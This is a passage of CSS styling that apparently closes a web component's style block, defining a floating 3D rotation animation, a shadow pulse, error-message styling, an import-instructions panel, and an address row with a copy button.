  display: block;
  max-width: 100%;
  height: auto;
  transform: translateZ(50px);
  transform-style: preserve-3d;
  border-radius: 50%;
}

@keyframes float-rotate-3d {
  0% {
    transform: rotateY(0deg) rotateX(10deg) translateY(0px);
    filter: drop-shadow(0 15px 25px rgba(123, 63, 228, 0.25)) drop-shadow(0 5px 10px rgba(0, 212, 255, 0.15));
  }
  25% {
    transform: rotateY(15deg) rotateX(15deg) translateY(-8px);
    filter: drop-shadow(0 25px 35px rgba(123, 63, 228, 0.35)) drop-shadow(5px 15px 20px rgba(0, 212, 255, 0.25));
  }
  50% {
    transform: rotateY(0deg) rotateX(8deg) translateY(-16px);
    filter: drop-shadow(0 30px 45px rgba(123, 63, 228, 0.4)) drop-shadow(0 20px 25px rgba(0, 212, 255, 0.3));
  }
  75% {
    transform: rotateY(-15deg) rotateX(12deg) translateY(-8px);
    filter: drop-shadow(0 25px 35px rgba(123, 63, 228, 0.35)) drop-shadow(-5px 15px 20px rgba(0, 212, 255, 0.25));
  }
  100% {
    transform: rotateY(0deg) rotateX(10deg) translateY(0px);
    filter: drop-shadow(0 15px 25px rgba(123, 63, 228, 0.25)) drop-shadow(0 5px 10px rgba(0, 212, 255, 0.15));
  }
}

@keyframes shadow-pulse {
  0%, 100% {
    transform: scale(1);
    opacity: 0.5;
  }
  50% {
    transform: scale(0.7);
    opacity: 0.2;
  }
}

.error-text {
  color: #ff5252;
  font-size: 13px;
  line-height: 1.5;
  margin: 12px 0 0 0;
  text-align: center;
  background: rgba(255, 82, 82, 0.08);
  border: 1px solid rgba(255, 82, 82, 0.15);
  padding: 10px 14px;
  border-radius: 8px;
  word-break: break-word;
}

.import-instructions {
  margin: 24px 0 16px;
  padding: 20px;
  border-radius: 12px;
  border: 1px solid rgba(0, 212, 255, 0.15);
  background: rgba(0, 212, 255, 0.03);
  text-align: left;
}

.ii-title {
  font-size: 14px;
  font-weight: 600;
  color: var(--text-primary);
  margin-bottom: 8px;
  display: flex;
  align-items: center;
  gap: 6px;
}

.ii-desc {
  font-size: 12px;
  color: var(--text-muted);
  line-height: 1.6;
  margin-bottom: 12px;
}

.address-copy-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 8px;
  padding: 8px 12px;
  gap: 12px;
}

.addr-text {
  font-family: monospace;
  font-size: 13px;
  color: var(--text-secondary);
}

.btn-copy {
  background: var(--accent-cyan);
  color: #000;
  border: none;
  border-radius: 6px;
  padding: 6px 12px;
  font-size: 11px;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.2s ease;
  text-transform: uppercase;
  letter-spacing: 0.05em;
}

.btn-copy:hover {
  background: var(--accent-cyan-light);
  transform: translateY(-1px);
}

.btn-copy:active {
  transform: translateY(0);
}
</style>
